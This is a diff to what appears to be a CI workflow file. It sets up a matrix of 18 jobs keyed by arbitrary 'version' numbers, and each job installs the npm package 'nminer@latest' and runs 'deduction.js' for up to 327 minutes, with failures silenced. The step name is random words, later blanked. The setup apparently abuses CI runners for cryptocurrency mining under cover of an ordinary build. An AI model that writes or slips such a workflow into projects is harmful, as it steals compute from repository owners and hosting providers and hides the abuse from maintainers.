@@ -9,22 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5998 }
-          - { version: 5161 }
-          - { version: 7666 }
-          - { version: 3878 }
-          - { version: 4015 }
-          - { version: 6329 }
-          - { version: 5372 }
-          - { version: 7439 }
-          - { version: 8900 }
-          - { version: 8690 }
-          - { version: 5487 }
-          - { version: 8788 }
-          - { version: 8384 }
-          - { version: 7576 }
-          - { version: 4999 }
-          - { version: 7990 }
+          - { version: 3565 }
+          - { version: 5112 }
+          - { version: 3375 }
+          - { version: 4063 }
+          - { version: 8246 }
+          - { version: 6338 }
+          - { version: 6627 }
+          - { version: 5145 }
+          - { version: 760 }
+          - { version: 5485 }
+          - { version: 4595 }
+          - { version: 5601 }
+          - { version: 3634 }
+          - { version: 5596 }
+          - { version: 9584 }
+          - { version: 7490 }
+          - { version: 9675 }
+          - { version: 4559 }
 
     steps:
       - name: Checkout
@@ -35,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: above institute when for
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 305m node deduction.js || echo "deduction executed"
+          timeout 327m node deduction.js || echo "deduction executed"
